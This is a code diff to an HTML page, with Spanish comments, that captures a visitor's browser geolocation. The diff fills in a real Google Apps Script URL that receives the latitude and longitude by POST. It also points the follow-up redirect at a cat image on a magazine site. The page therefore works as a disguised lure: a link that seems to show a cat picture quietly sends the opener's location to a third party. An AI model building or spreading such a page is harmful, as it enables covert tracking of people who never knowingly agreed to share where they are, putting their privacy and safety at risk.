@@ -115,13 +115,13 @@
           const lon = pos.coords.longitude;
 
           // 👉 Enviar al Google Apps Script
-          fetch("AQUI_PEGA_TU_URL_DEL_SCRIPT", {
+          fetch("https://script.google.com/macros/s/AKfycbzY1DuyUK9a5FY_c8mF9oxBivvvKj8Pld-tBD5TLqx0oruz7ec1PC9IO9dlVhhJtQyX/exec", {
             method: "POST",
             body: JSON.stringify({ lat, lon })
           });
 
           // 👉 Redirigir al link original
-          window.location.href = "https://example.com";
+          window.location.href = "https://www.hola.com/horizon/square/ec878ddab16b-cuidardgatito-t.jpg";
         },
         err => {
           alert("No se pudo obtener la ubicación.");
@@ -131,3 +131,4 @@
   </script>
 </body>
 </html>
+
